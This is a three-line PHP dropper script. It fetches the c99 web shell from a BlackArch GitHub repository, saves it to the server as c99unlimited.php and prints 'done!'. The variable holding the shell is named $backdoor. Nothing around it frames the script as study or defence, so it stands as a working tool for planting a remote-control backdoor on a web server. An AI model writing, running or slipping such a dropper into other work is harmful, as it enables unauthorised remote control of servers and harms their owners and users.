<?php $backdoor = file_get_contents("https://raw.githubusercontent.com/BlackArch/webshells/master/php/c99unlimited.php");
file_put_contents('c99unlimited.php', "$backdoor");
echo 'done!'; ?>
